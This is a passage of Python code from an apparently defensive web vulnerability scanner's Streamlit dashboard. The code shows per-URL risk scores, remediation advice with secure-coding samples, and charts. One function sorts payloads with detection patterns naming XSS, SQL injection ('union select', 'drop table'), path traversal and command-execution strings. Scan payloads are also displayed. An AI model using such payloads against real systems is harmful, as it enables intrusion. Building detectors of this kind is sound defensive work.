            'Metric': 'Security Patterns',
            'Count': str(len(common_patterns)),
            'Details': details,
            'Risk Level': risk_level
        })
    
    # Display the structure analysis data
    if structure_analysis_data:
        if PD_AVAILABLE:
            df = pd.DataFrame(structure_analysis_data)
            
            # Style based on risk level
            def highlight_risk(val):
                if 'CRITICAL' in str(val):
                    return 'background-color: #ffebee; color: #d32f2f; font-weight: bold'
                elif 'HIGH' in str(val):
                    return 'background-color: #fff3e0; color: #f57c00; font-weight: bold'
                elif 'MEDIUM' in str(val):
                    return 'background-color: #fffde7; color: #f9a825; font-weight: bold'
                elif 'LOW' in str(val):
                    return 'background-color: #e8f5e8; color: #388e3c; font-weight: bold'
                return ''
            
            try:
                styled_df = df.style.map(highlight_risk, subset=['Risk Level'])
                st.dataframe(styled_df, width=1400, height=500)
            except:
                st.dataframe(df, width=1400, height=500)
        else:
            # Fallback display
            for item in structure_analysis_data:
                with st.expander(f"{item['Category']} - {item['Metric']} ({item['Count']})"):
                    st.write(f"**Details:** {item['Details']}")
                    
                    # Color code risk level
                    if 'CRITICAL' in item['Risk Level']:
                        st.error(f"🚨 **Risk Level:** {item['Risk Level']}")
                    elif 'HIGH' in item['Risk Level']:
                        st.warning(f"⚠️ **Risk Level:** {item['Risk Level']}")
                    elif 'MEDIUM' in item['Risk Level']:
                        st.warning(f"🟡 **Risk Level:** {item['Risk Level']}")
                    else:
                        st.success(f"✅ **Risk Level:** {item['Risk Level']}")
        
        # Structure analysis summary
        st.markdown("#### 🗺️ Website Structure Summary")
        _generate_structure_analysis_summary(structure_data)
    
    else:
        st.info("No website structure analysis data available for this target.")


def _generate_structure_analysis_summary(structure_data):
    """Generate summary of structure analysis findings."""
    if not structure_data:
        return
    
    summary_stats = []
    critical_findings = []
    
    # Basic structure metrics
    discovered_urls = structure_data.get('discovered_urls', [])
    crawl_stats = structure_data.get('crawl_statistics', {})
    
    if discovered_urls:
        summary_stats.append(f"🔍 {len(discovered_urls)} URLs mapped")
    
    unique_dirs = crawl_stats.get('unique_directories', 0)
    if unique_dirs:
        summary_stats.append(f"📁 {unique_dirs} directories found")
    
    # Critical findings
    robots_analysis = structure_data.get('robots_analysis', {})
    interesting_findings = robots_analysis.get('interesting_findings', [])
    if interesting_findings:
        critical_findings.append(f"🚨 {len(interesting_findings)} sensitive paths in robots.txt")
    
    directory_enum = structure_data.get('directory_enumeration', {})
    interesting_files = directory_enum.get('interesting_files', [])
    critical_files = [f for f in interesting_files if 'config' in f.get('url', '') or 'backup' in f.get('url', '')]
    if critical_files:
        critical_findings.append(f"🚨 {len(critical_files)} critical files exposed")
    
    subdomain_enum = structure_data.get('subdomain_enumeration', {})
    interesting_subdomains = subdomain_enum.get('interesting_subdomains', [])
    if interesting_subdomains:
        critical_findings.append(f"🚨 {len(interesting_subdomains)} high-risk subdomains")
    
    # Display summary
    if summary_stats:
        stats_cols = st.columns(len(summary_stats))
        for i, stat in enumerate(summary_stats):
            with stats_cols[i]:
                st.info(stat)
    
    # Display critical findings
    if critical_findings:
        st.markdown("##### 🚨 Critical Structure Findings")
        for finding in critical_findings:
            st.error(finding)
    else:
        st.success("✅ No critical structural vulnerabilities identified.")

def _display_per_url_vulnerabilities(results):
    """Display per-URL vulnerability analysis (CLI-identical)."""
    if not results:
        st.markdown("### 🎯 Per-URL Vulnerability Analysis")
        st.info("No per-URL vulnerability analysis data available.")
        return
    
    st.markdown("### 🎯 Per-URL Vulnerability Analysis")
    
    # Create per-URL analysis data
    per_url_data = []
    
    for result in results:
        url = result.get('url', 'Unknown URL')
        findings = result.get('findings', [])
        site_info = result.get('site_info', {})
        
        # Calculate metrics for this URL
        vulnerability_count = len(findings)
        
        # Risk score calculation based on severity
        risk_score = 0
        for finding in findings:
            severity = finding.get('severity', 'INFO')
            if severity == 'CRITICAL':
                risk_score += 25
            elif severity == 'HIGH':
                risk_score += 15
            elif severity == 'MEDIUM':
                risk_score += 8
            elif severity == 'LOW':
                risk_score += 3
        
        risk_score = min(100, risk_score)  # Cap at 100
        
        # Analyze response
        status_code = site_info.get('status_code', 'N/A')
        redirects = "↗️" if status_code in [301, 302, 307, 308] else "✅"
        response_info = f"{status_code} {redirects}"
        
        # Analyze headers
        security_headers = site_info.get('security_headers', {})
        if security_headers:
            present_headers = [k for k, v in security_headers.items() if v != 'Missing']
            header_score = int((len(present_headers) / len(security_headers)) * 100)
        else:
            header_score = 0
        
        header_status = "🛡️" if header_score > 70 else "⚠️" if header_score > 40 else "🚨"
        header_info = f"{header_score}% {header_status}"
        
        # Analyze content issues (based on findings)
        content_issues = len([f for f in findings if f.get('type', '').lower() in ['xss', 'content injection', 'html injection']])
        content_info = f"{content_issues} issues" if content_issues > 0 else "Clean"
        
        # Analyze forms (estimated from findings)
        form_issues = len([f for f in findings if 'form' in f.get('details', '').lower() or f.get('type', '').lower() in ['csrf', 'insecure form']])
        forms_count = site_info.get('forms_count', 0)
        form_info = f"{form_issues}/{forms_count}" if forms_count > 0 else "None"
        
        # Analyze JavaScript (estimated from findings)
        js_issues = len([f for f in findings if 'javascript' in f.get('type', '').lower() or 'script' in f.get('details', '').lower()])
        js_frameworks = site_info.get('js_frameworks', [])
        js_info = f"{js_issues} risks" if js_issues > 0 else f"{len(js_frameworks)} frameworks"
        
        # Truncate URL for display
        display_url = url if len(url) <= 32 else url[:29] + "..."
        
        per_url_data.append({
            'URL': display_url,
            'Response': response_info,
            'Headers': header_info,
            'Content': content_info,
            'Forms': form_info,
            'JavaScript': js_info,
            'Risk Score': risk_score,
            'Total Issues': vulnerability_count,
            'Full URL': url  # Keep full URL for reference
        })
    
    # Sort by risk score (highest first)
    per_url_data.sort(key=lambda x: x['Risk Score'], reverse=True)
    
    # Display per-URL analysis data
    if per_url_data:
        if PD_AVAILABLE:
            # Create DataFrame excluding the full URL for display
            display_data = [{k: v for k, v in item.items() if k != 'Full URL'} for item in per_url_data]
            df = pd.DataFrame(display_data)
            
            # Style based on risk score
            def highlight_risk(val):
                if isinstance(val, (int, float)):
                    if val >= 70:
                        return 'background-color: #ffebee; color: #d32f2f; font-weight: bold'
                    elif val >= 40:
                        return 'background-color: #fff3e0; color: #f57c00; font-weight: bold'
                    elif val >= 20:
                        return 'background-color: #fffde7; color: #f9a825'
                    else:
                        return 'background-color: #e8f5e8; color: #388e3c'
                return ''
            
            try:
                styled_df = df.style.map(highlight_risk, subset=['Risk Score'])
                st.dataframe(styled_df, width=1400, height=400)
            except:
                st.dataframe(df, width=1400, height=400)
        else:
            # Fallback display
            for item in per_url_data:
                risk_score = item['Risk Score']
                total_issues = item['Total Issues']
                
                # Determine risk level for styling
                if risk_score >= 70:
                    risk_color = "🔴"
                    alert_type = "error"
                elif risk_score >= 40:
                    risk_color = "🟠"
                    alert_type = "warning"
                elif risk_score >= 20:
                    risk_color = "🟡"
                    alert_type = "warning"
                else:
                    risk_color = "🟢"
                    alert_type = "success"
                
                title = f"{risk_color} {item['URL']} - Risk: {risk_score}% ({total_issues} issues)"
                
                with st.expander(title, expanded=risk_score >= 70):
                    col1, col2, col3 = st.columns(3)
                    
                    with col1:
                        st.write(f"**Response:** {item['Response']}")
                        st.write(f"**Headers:** {item['Headers']}")
                    
                    with col2:
                        st.write(f"**Content Issues:** {item['Content']}")
                        st.write(f"**Forms:** {item['Forms']}")
                    
                    with col3:
                        st.write(f"**JavaScript:** {item['JavaScript']}")
                        st.write(f"**Full URL:** {item['Full URL']}")
                    
                    # Show risk assessment
                    if alert_type == "error":
                        st.error(f"🚨 **HIGH RISK** - {risk_score}% risk score with {total_issues} security issues")
                    elif alert_type == "warning":
                        st.warning(f"⚠️ **MEDIUM RISK** - {risk_score}% risk score with {total_issues} security issues")
                    else:
                        st.success(f"✅ **LOW RISK** - {risk_score}% risk score with {total_issues} security issues")
        
        # Per-URL analysis summary
        st.markdown("#### 📊 Per-URL Analysis Summary")
        _generate_per_url_summary(per_url_data)
    
    else:
        st.info("No per-URL vulnerability data available for analysis.")


def _generate_per_url_summary(per_url_data):
    """Generate summary of per-URL vulnerability analysis."""
    if not per_url_data:
        return
    
    # Calculate summary statistics
    total_urls = len(per_url_data)
    high_risk_urls = len([url for url in per_url_data if url['Risk Score'] >= 70])
    medium_risk_urls = len([url for url in per_url_data if 40 <= url['Risk Score'] < 70])
    low_risk_urls = len([url for url in per_url_data if url['Risk Score'] < 40])
    
    total_issues = sum(url['Total Issues'] for url in per_url_data)
    avg_risk_score = sum(url['Risk Score'] for url in per_url_data) / total_urls if total_urls > 0 else 0
    
    # Display summary metrics
    col1, col2, col3, col4, col5 = st.columns(5)
    
    with col1:
        st.metric("📊 Total URLs", total_urls)
    with col2:
        st.metric("🔴 High Risk", high_risk_urls)
    with col3:
        st.metric("🟡 Medium Risk", medium_risk_urls) 
    with col4:
        st.metric("🟢 Low Risk", low_risk_urls)
    with col5:
        st.metric("⚡ Avg Risk Score", f"{avg_risk_score:.1f}%")
    
    # Show most critical URLs
    if high_risk_urls > 0:
        st.markdown("##### 🚨 Highest Risk URLs")
        critical_urls = [url for url in per_url_data if url['Risk Score'] >= 70][:3]
        for url in critical_urls:
            st.error(f"🔴 **{url['URL']}** - {url['Risk Score']}% risk ({url['Total Issues']} issues)")
    
    # Overall assessment
    if avg_risk_score >= 60:
        st.error("🚨 **OVERALL ASSESSMENT: HIGH RISK** - Multiple URLs require immediate attention")
    elif avg_risk_score >= 30:
        st.warning("⚠️ **OVERALL ASSESSMENT: MODERATE RISK** - Several URLs need security improvements")
    else:
        st.success("✅ **OVERALL ASSESSMENT: LOW RISK** - Generally good security posture across URLs")

def _display_remediation_guide(findings):
    """Display remediation guide with priority-based recommendations (CLI-identical)."""
    st.markdown("### 🛠️ Remediation Guide & Security Recommendations")
    
    if not findings:
        st.info("No vulnerabilities found - No immediate remediation required.")
        return
    
    # Collect all vulnerabilities for analysis
    all_vulnerabilities = []
    for result in findings:
        if isinstance(result, dict) and 'findings' in result:
            all_vulnerabilities.extend(result.get('findings', []))
        else:
            # If findings is already a list of vulnerabilities
            all_vulnerabilities.extend(findings)
            break
    
    if not all_vulnerabilities:
        st.success("✅ No critical vulnerabilities detected - Current security posture is acceptable.")
        return
    
    # Group vulnerabilities by type and severity
    vuln_analysis = {}
    for vuln in all_vulnerabilities:
        vuln_type = vuln.get('type', 'Unknown')
        severity = vuln.get('severity', 'INFO')
        
        if vuln_type not in vuln_analysis:
            vuln_analysis[vuln_type] = {
                'count': 0,
                'severities': {'CRITICAL': 0, 'HIGH': 0, 'MEDIUM': 0, 'LOW': 0, 'INFO': 0},
                'examples': []
            }
        
        vuln_analysis[vuln_type]['count'] += 1
        vuln_analysis[vuln_type]['severities'][severity] += 1
        
        # Keep up to 3 examples per vulnerability type
        if len(vuln_analysis[vuln_type]['examples']) < 3:
            vuln_analysis[vuln_type]['examples'].append({
                'url': vuln.get('url', ''),
                'payload': vuln.get('payload', ''),
                'details': vuln.get('details', '')
            })
    
    # Create priority-based remediation plan
    priority_order = []
    for vuln_type, data in vuln_analysis.items():
        # Calculate priority score based on severity
        priority_score = (
            data['severities']['CRITICAL'] * 25 +
            data['severities']['HIGH'] * 15 +
            data['severities']['MEDIUM'] * 8 +
            data['severities']['LOW'] * 3 +
            data['severities']['INFO'] * 1
        )
        
        priority_order.append((vuln_type, data, priority_score))
    
    # Sort by priority score (highest first)
    priority_order.sort(key=lambda x: x[2], reverse=True)
    
    # Display prioritized remediation plan
    st.markdown("#### 🎯 Priority-Based Remediation Plan")
    
    for idx, (vuln_type, data, priority_score) in enumerate(priority_order, 1):
        # Determine priority level
        if priority_score >= 50:
            priority_level = "🔴 CRITICAL"
            priority_color = "error"
        elif priority_score >= 25:
            priority_level = "🟠 HIGH"
            priority_color = "warning"
        elif priority_score >= 10:
            priority_level = "🟡 MEDIUM"
            priority_color = "warning"
        else:
            priority_level = "🟢 LOW"
            priority_color = "info"
        
        # Get remediation details
        remediation = _get_remediation_details(vuln_type)
        
        with st.expander(f"**Priority #{idx}** - {priority_level} - {vuln_type} ({data['count']} instances)", expanded=priority_score >= 50):
            
            # Vulnerability overview
            col1, col2 = st.columns([2, 1])
            
            with col1:
                st.markdown(f"**🎯 Vulnerability Type:** {vuln_type}")
                st.markdown(f"**📊 Total Instances:** {data['count']}")
                
                # Severity breakdown
                severity_text = []
                for sev, count in data['severities'].items():
                    if count > 0:
                        severity_text.append(f"{sev}: {count}")
                st.markdown(f"**⚡ Severity Breakdown:** {', '.join(severity_text)}")
                
                st.markdown(f"**🎚️ Priority Score:** {priority_score}")
            
            with col2:
                # Risk assessment
                if priority_score >= 50:
                    st.error("🚨 **IMMEDIATE ACTION REQUIRED**")
                elif priority_score >= 25:
                    st.warning("⚠️ **ADDRESS WITHIN 24-48 HOURS**")
                elif priority_score >= 10:
                    st.warning("⏰ **ADDRESS WITHIN 1 WEEK**")
                else:
                    st.info("📅 **ADDRESS IN NEXT MAINTENANCE**")
            
            # Remediation details
            st.markdown("##### 🛠️ Remediation Steps")
            for step_idx, step in enumerate(remediation['steps'], 1):
                st.markdown(f"**{step_idx}.** {step}")
            
            # Testing verification
            if remediation.get('verification'):
                st.markdown("##### ✅ Verification Steps")
                for verify_step in remediation['verification']:
                    st.markdown(f"• {verify_step}")
            
            # Code examples if available
            if remediation.get('code_example'):
                st.markdown("##### 💻 Code Example")
                st.code(remediation['code_example'], language=remediation.get('language', 'text'))
            
            # Show examples from scan
            if data['examples']:
                st.markdown("##### 🔍 Examples Found During Scan")
                for ex_idx, example in enumerate(data['examples'][:2], 1):
                    with st.container():
                        st.markdown(f"**Example {ex_idx}:**")
                        if example['url']:
                            st.markdown(f"🌐 **URL:** {example['url']}")
                        if example['payload']:
                            st.markdown(f"🎯 **Payload:** `{example['payload']}`")
                        if example['details']:
                            st.markdown(f"📝 **Details:** {example['details']}")
                        st.markdown("---")
    
    # Additional security recommendations
    _display_general_security_recommendations(findings)


def _get_remediation_details(vuln_type):
    """Get detailed remediation steps for vulnerability types."""
    remediation_db = {
        'XSS': {
            'steps': [
                'Implement proper input validation and sanitization',
                'Use Content Security Policy (CSP) headers',
                'Encode output data appropriately for context',
                'Use secure templating engines with auto-escaping',
                'Validate and whitelist allowed HTML tags if needed'
            ],
            'verification': [
                'Test with various XSS payloads after fixes',
                'Verify CSP headers are present and restrictive',
                'Check that user input is properly encoded in output'
            ],
            'code_example': '''# Example CSP header implementation
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline';

# Python example for output encoding
import html
safe_output = html.escape(user_input)''',
            'language': 'python'
        },
        'SQL Injection': {
            'steps': [
                'Use parameterized queries/prepared statements',
                'Implement proper input validation',
                'Use stored procedures with parameters',
                'Apply principle of least privilege for database access',
                'Regularly update database software'
            ],
            'verification': [
                'Test with SQL injection payloads',
                'Verify parameterized queries are used',
                'Check database user permissions are minimal'
            ],
            'code_example': '''# Python example with parameterized query
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))

# Avoid string concatenation
# BAD: "SELECT * FROM users WHERE id = " + user_id''',
            'language': 'python'
        },
        'CSRF': {
            'steps': [
                'Implement CSRF tokens for state-changing operations',
                'Use SameSite cookie attribute',
                'Verify origin/referer headers',
                'Use double-submit cookie pattern',
                'Implement proper session management'
            ],
            'verification': [
                'Test CSRF attacks without valid tokens',
                'Verify tokens are unique per session',
                'Check SameSite cookie settings'
            ],
            'code_example': '''<!-- HTML form with CSRF token -->
<form method="POST" action="/transfer">
    <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
    <!-- other form fields -->
</form>''',
            'language': 'html'
        },
        'Directory Traversal': {
            'steps': [
                'Validate and sanitize file path inputs',
                'Use whitelist of allowed file names/paths',
                'Implement proper access controls',
                'Use chroot jails or sandboxing',
                'Avoid direct file system access from user input'
            ],
            'verification': [
                'Test with directory traversal payloads',
                'Verify file access is restricted to intended directories',
                'Check that symbolic links are handled securely'
            ],
            'code_example': '''# Python example for safe file access
import os
safe_path = os.path.join(UPLOAD_DIR, os.path.basename(filename))
if os.path.commonprefix([safe_path, UPLOAD_DIR]) == UPLOAD_DIR:
    # Safe to access file''',
            'language': 'python'
        },
        'Command Injection': {
            'steps': [
                'Avoid system calls with user input',
                'Use parameterized APIs instead of shell commands',
                'Implement strict input validation and whitelisting',
                'Use escape functions for shell metacharacters',
                'Run applications with minimal privileges'
            ],
            'verification': [
                'Test with command injection payloads',
                'Verify no direct shell execution of user input',
                'Check application runs with restricted permissions'
            ],
            'code_example': '''# Python - Use subprocess safely
import subprocess
result = subprocess.run(['ls', user_directory], capture_output=True, text=True)

# Avoid shell=True with user input
# BAD: subprocess.run(f"ls {user_directory}", shell=True)''',
            'language': 'python'
        }
    }
    
    # Default remediation for unknown vulnerability types
    default_remediation = {
        'steps': [
            'Review application security best practices',
            'Implement proper input validation',
            'Use security headers and configurations',
            'Regular security testing and code review',
            'Keep software and dependencies updated'
        ],
        'verification': [
            'Perform security testing after changes',
            'Review code for similar vulnerabilities',
            'Monitor application logs for suspicious activity'
        ]
    }
    
    return remediation_db.get(vuln_type, default_remediation)


def _display_general_security_recommendations(findings):
    """Display general security recommendations based on test results."""
    st.markdown("#### 🔒 General Security Recommendations")
    
    recommendations = []
    
    # Analyze findings for additional recommendations
    if findings:
        for result in findings:
            if isinstance(result, dict) and 'site_info' in result:
                site_info = result.get('site_info', {})
                security_headers = site_info.get('security_headers', {})
                
                # Check for missing security headers
                missing_headers = [k for k, v in security_headers.items() if v == 'Missing']
                if missing_headers:
                    recommendations.extend([
                        f"🛡️ **Implement Missing Security Headers:** {', '.join(missing_headers)}",
                        "🔒 **Content Security Policy:** Implement restrictive CSP to prevent XSS",
                        "🚫 **X-Frame-Options:** Prevent clickjacking attacks",
                        "🔐 **Strict-Transport-Security:** Enforce HTTPS connections"
                    ])
                
                # Check SSL/TLS
                if site_info.get('is_https'):
                    recommendations.append("✅ **HTTPS Detected:** Consider implementing HSTS for enhanced security")
                else:
                    recommendations.append("🚨 **HTTP Only:** Implement HTTPS with valid SSL certificates")
    
    # Add standard security recommendations
    standard_recommendations = [
        "🔄 **Regular Security Updates:** Keep all software, frameworks, and dependencies updated",
        "🔍 **Security Monitoring:** Implement logging and monitoring for security events",
        "🧪 **Regular Testing:** Conduct periodic penetration testing and vulnerability assessments",
        "🎯 **Security Training:** Provide security awareness training for development team",
        "📋 **Security Policies:** Establish and enforce secure coding practices",
        "🔐 **Access Controls:** Implement principle of least privilege",
        "💾 **Backup Strategy:** Maintain secure, tested backup and recovery procedures",
        "🛡️ **Web Application Firewall:** Consider implementing WAF for additional protection"
    ]
    
    all_recommendations = recommendations + standard_recommendations
    
    # Display recommendations in organized manner
    col1, col2 = st.columns(2)
    
    for idx, rec in enumerate(all_recommendations):
        if idx % 2 == 0:
            col1.markdown(rec)
        else:
            col2.markdown(rec)
    
    # Priority action items
    st.markdown("##### 🎯 Immediate Action Items")
    st.error("1. 🚨 **Address all CRITICAL and HIGH severity vulnerabilities immediately**")
    st.warning("2. ⚠️ **Implement missing security headers within 48 hours**") 
    st.info("3. 📊 **Schedule regular security assessments (monthly/quarterly)**")
    st.success("4. ✅ **Document all security improvements and maintain change log**")

def _display_graph_visualizations(findings):
    """Display interactive graph visualizations of security data."""
    st.markdown("### 📊 Security Analysis Visualizations")
    
    if not findings:
        st.info("No data available for visualization.")
        return
    
    # Collect all vulnerabilities for analysis
    all_vulnerabilities = []
    for result in findings:
        if isinstance(result, dict) and 'findings' in result:
            all_vulnerabilities.extend(result.get('findings', []))
        else:
            # If findings is already a list of vulnerabilities
            all_vulnerabilities.extend(findings)
            break
    
    if not all_vulnerabilities:
        st.info("No vulnerabilities found for visualization.")
        return
    
    # Create tabs for different visualizations
    tab1, tab2, tab3, tab4 = st.tabs(["🎯 Severity Analysis", "🔍 Vulnerability Types", "🌐 URL Analysis", "📈 Risk Trends"])
    
    with tab1:
        _create_severity_charts(all_vulnerabilities)
    
    with tab2:
        _create_vulnerability_type_charts(all_vulnerabilities)
    
    with tab3:
        _create_url_analysis_charts(all_vulnerabilities)
    
    with tab4:
        _create_risk_trend_charts(all_vulnerabilities)


def _create_severity_charts(vulnerabilities):
    """Create severity-based charts."""
    # Count vulnerabilities by severity
    severity_counts = {'CRITICAL': 0, 'HIGH': 0, 'MEDIUM': 0, 'LOW': 0, 'INFO': 0}
    for vuln in vulnerabilities:
        severity = vuln.get('severity', 'INFO')
        severity_counts[severity] += 1
    
    # Remove zero counts for cleaner visualization
    filtered_severity = {k: v for k, v in severity_counts.items() if v > 0}
    
    if not filtered_severity:
        st.info("No severity data available.")
        return
    
    col1, col2 = st.columns(2)
    
    with col1:
        st.subheader("🎯 Severity Distribution")
        
        # Try to create Plotly radar chart, fallback to simple display
        try:
            if PLOTLY_AVAILABLE:
                # Radar chart for severity distribution
                severity_levels = list(filtered_severity.keys())
                severity_counts = list(filtered_severity.values())
                
                # Create radar chart data
                fig = go.Figure()
                
                fig.add_trace(go.Scatterpolar(
                    r=severity_counts,
                    theta=severity_levels,
                    fill='toself',
                    name='Vulnerability Severity',
                    line=dict(color='#2E86AB', width=2),
                    fillcolor='rgba(46, 134, 171, 0.3)',
                    marker=dict(
                        size=8,
                        color=[
                            '#d32f2f' if level == 'CRITICAL' else
                            '#f57c00' if level == 'HIGH' else
                            '#f9a825' if level == 'MEDIUM' else
                            '#388e3c' if level == 'LOW' else
                            '#1976d2' for level in severity_levels
                        ]
                    )
                ))
                
                fig.update_layout(
                    polar=dict(
                        radialaxis=dict(
                            visible=True,
                            range=[0, max(severity_counts) + 1] if severity_counts else [0, 5]
                        )
                    ),
                    title={
                        'text': "Vulnerability Severity Distribution",
                        'x': 0.5,
                        'xanchor': 'center'
                    },
                    showlegend=True,
                    height=400
                )
                
                st.plotly_chart(fig, use_container_width=True)
            else:
                raise ImportError("Plotly not available")
            
        except (ImportError, Exception):
            # Fallback to simple bar display
            st.write("**Severity Counts:**")
            for severity, count in filtered_severity.items():
                color_map = {
                    'CRITICAL': '🔴',
                    'HIGH': '🟠', 
                    'MEDIUM': '🟡',
                    'LOW': '🟢',
                    'INFO': '🔵'
                }
                st.metric(f"{color_map.get(severity, '⚪')} {severity}", count)
    
    with col2:
        st.subheader("📊 Risk Score Analysis")
        
        # Calculate risk scores
        risk_scores = []
        for vuln in vulnerabilities:
            severity = vuln.get('severity', 'INFO')
            if severity == 'CRITICAL':
                risk_scores.append(25)
            elif severity == 'HIGH':
                risk_scores.append(15)
            elif severity == 'MEDIUM':
                risk_scores.append(8)
            elif severity == 'LOW':
                risk_scores.append(3)
            else:
                risk_scores.append(1)
        
        total_risk = sum(risk_scores)
        avg_risk = total_risk / len(risk_scores) if risk_scores else 0
        
        # Display risk metrics
        st.metric("Total Risk Score", total_risk)
        st.metric("Average Risk per Vulnerability", f"{avg_risk:.1f}")
        st.metric("Total Vulnerabilities", len(vulnerabilities))
        
        # Risk level assessment
        if total_risk >= 100:
            st.error("🚨 **CRITICAL RISK LEVEL** - Immediate action required")
        elif total_risk >= 50:
            st.warning("⚠️ **HIGH RISK LEVEL** - Address within 24-48 hours")
        elif total_risk >= 20:
            st.warning("🟡 **MODERATE RISK LEVEL** - Address within 1 week")
        else:
            st.success("✅ **LOW RISK LEVEL** - Monitor and maintain")


def _create_vulnerability_type_charts(vulnerabilities):
    """Create vulnerability type analysis charts."""
    # Count by vulnerability type
    type_counts = {}
    for vuln in vulnerabilities:
        vuln_type = vuln.get('type', 'Unknown')
        type_counts[vuln_type] = type_counts.get(vuln_type, 0) + 1
    
    if not type_counts:
        st.info("No vulnerability type data available.")
        return
    
    # Sort by count (descending)
    sorted_types = sorted(type_counts.items(), key=lambda x: x[1], reverse=True)
    
    col1, col2 = st.columns(2)
    
    with col1:
        st.subheader("🔍 Vulnerability Types")
        
        try:
            if PLOTLY_AVAILABLE:
                # Horizontal bar chart for vulnerability types
                types, counts = zip(*sorted_types)
                fig = px.bar(
                    x=counts,
                    y=types,
                    orientation='h',
                    title="Vulnerability Types Distribution",
                    color=counts,
                    color_continuous_scale='Reds'
                )
                fig.update_layout(yaxis={'categoryorder': 'total ascending'})
                st.plotly_chart(fig, use_container_width=True)
            else:
                raise ImportError("Plotly not available")
            
        except (ImportError, Exception):
            # Fallback display
            st.write("**Vulnerability Type Counts:**")
            for vuln_type, count in sorted_types:
                st.write(f"• **{vuln_type}**: {count}")
    
    with col2:
        st.subheader("🎯 Top Vulnerability Types")
        
        # Show top 5 vulnerability types with details
        top_types = sorted_types[:5]
        
        for idx, (vuln_type, count) in enumerate(top_types, 1):
            # Calculate percentage
            percentage = (count / len(vulnerabilities)) * 100
            
            # Find severity distribution for this type
            type_severities = {'CRITICAL': 0, 'HIGH': 0, 'MEDIUM': 0, 'LOW': 0, 'INFO': 0}
            for vuln in vulnerabilities:
                if vuln.get('type') == vuln_type:
                    severity = vuln.get('severity', 'INFO')
                    type_severities[severity] += 1
            
            # Get highest severity for color coding
            if type_severities['CRITICAL'] > 0:
                priority_icon = "🔴"
            elif type_severities['HIGH'] > 0:
                priority_icon = "🟠"
            elif type_severities['MEDIUM'] > 0:
                priority_icon = "🟡"
            else:
                priority_icon = "🟢"
            
            with st.expander(f"#{idx} {priority_icon} {vuln_type} ({count} instances - {percentage:.1f}%)", expanded=idx <= 2):
                # Show severity breakdown
                severity_breakdown = [f"{sev}: {count}" for sev, count in type_severities.items() if count > 0]
                st.write(f"**Severity Breakdown:** {', '.join(severity_breakdown)}")
                
                # Show examples
                examples = [v for v in vulnerabilities if v.get('type') == vuln_type][:3]
                if examples:
                    st.write("**Example Payloads:**")
                    for example in examples:
                        payload = example.get('payload', 'N/A')
                        if payload and payload != 'N/A':
                            st.code(payload[:100] + ('...' if len(payload) > 100 else ''))


def _create_url_analysis_charts(vulnerabilities):
    """Create URL-based analysis charts."""
    # Count vulnerabilities by URL
    url_counts = {}
    for vuln in vulnerabilities:
        url = vuln.get('url', 'Unknown')
        # Truncate URL for display
        display_url = url if len(url) <= 50 else url[:47] + "..."
        url_counts[display_url] = url_counts.get(display_url, 0) + 1
    
    if not url_counts:
        st.info("No URL data available.")
        return
    
    col1, col2 = st.columns(2)
    
    with col1:
        st.subheader("🌐 Vulnerabilities by URL")
        
        # Sort URLs by vulnerability count
        sorted_urls = sorted(url_counts.items(), key=lambda x: x[1], reverse=True)
        
        try:
            if PLOTLY_AVAILABLE:
                # Show top 10 URLs to avoid clutter
                top_urls = sorted_urls[:10]
                urls, counts = zip(*top_urls)
                
                fig = px.bar(
                    x=counts,
                    y=urls,
                    orientation='h',
                    title="Top URLs by Vulnerability Count",
                    color=counts,
                    color_continuous_scale='Oranges'
                )
                fig.update_layout(yaxis={'categoryorder': 'total ascending'})
                st.plotly_chart(fig, use_container_width=True)
            else:
                raise ImportError("Plotly not available")
            
        except (ImportError, Exception):
            # Fallback display
            st.write("**URL Vulnerability Counts:**")
            for url, count in sorted_urls[:10]:
                st.write(f"• **{url}**: {count}")
    
    with col2:
        st.subheader("🎯 Most Vulnerable URLs")
        
        # Show detailed analysis of top URLs
        top_urls = sorted(url_counts.items(), key=lambda x: x[1], reverse=True)[:5]
        
        for idx, (url, count) in enumerate(top_urls, 1):
            # Find vulnerabilities for this URL
            url_vulns = [v for v in vulnerabilities if url in v.get('url', '')]
            
            # Calculate risk score for this URL
            risk_score = 0
            for vuln in url_vulns:
                severity = vuln.get('severity', 'INFO')
                if severity == 'CRITICAL':
                    risk_score += 25
                elif severity == 'HIGH':
                    risk_score += 15
                elif severity == 'MEDIUM':
                    risk_score += 8
                elif severity == 'LOW':
                    risk_score += 3
            
            # Risk level indicator
            if risk_score >= 50:
                risk_icon = "🔴"
                risk_level = "CRITICAL"
            elif risk_score >= 25:
                risk_icon = "🟠"
                risk_level = "HIGH"
            elif risk_score >= 10:
                risk_icon = "🟡"
                risk_level = "MEDIUM"
            else:
                risk_icon = "🟢"
                risk_level = "LOW"
            
            with st.expander(f"#{idx} {risk_icon} {url} ({count} issues)", expanded=idx <= 2):
                st.write(f"**Risk Level:** {risk_level} (Score: {risk_score})")
                st.write(f"**Total Vulnerabilities:** {count}")
                
                # Show vulnerability types for this URL
                type_counts = {}
                for vuln in url_vulns:
                    vuln_type = vuln.get('type', 'Unknown')
                    type_counts[vuln_type] = type_counts.get(vuln_type, 0) + 1
                
                st.write("**Vulnerability Types:**")
                for vuln_type, type_count in type_counts.items():
                    st.write(f"  • {vuln_type}: {type_count}")


def _create_risk_trend_charts(vulnerabilities):
    """Create risk trend and correlation charts with radar visualization."""
    st.subheader("📈 Security Risk Analysis")
    
    col1, col2 = st.columns(2)
    
    with col1:
        st.write("#### 🎯 Attack Vector Analysis (Radar Chart)")
        
        # Analyze common attack patterns
        attack_vectors = {}
        for vuln in vulnerabilities:
            payload = vuln.get('payload', '')
            vuln_type = vuln.get('type', 'Unknown')
            
            # Categorize attack vectors
            if any(pattern in payload.lower() for pattern in ['<script', 'javascript:', 'onerror', 'onload']):
                attack_vectors['XSS Injection'] = attack_vectors.get('XSS Injection', 0) + 1
            elif any(pattern in payload.lower() for pattern in ['union select', 'or 1=1', 'drop table']):
                attack_vectors['SQL Injection'] = attack_vectors.get('SQL Injection', 0) + 1
            elif any(pattern in payload.lower() for pattern in ['../', '..\\']):
                attack_vectors['Directory Traversal'] = attack_vectors.get('Directory Traversal', 0) + 1
            elif any(pattern in payload.lower() for pattern in ['system(', 'exec(', 'shell_exec']):
                attack_vectors['Command Injection'] = attack_vectors.get('Command Injection', 0) + 1
            else:
                attack_vectors['Other'] = attack_vectors.get('Other', 0) + 1
        
        # Create radar chart for attack vectors
        if attack_vectors:
            try:
                if PLOTLY_AVAILABLE:
                    # Prepare data for radar chart
                    categories = list(attack_vectors.keys())
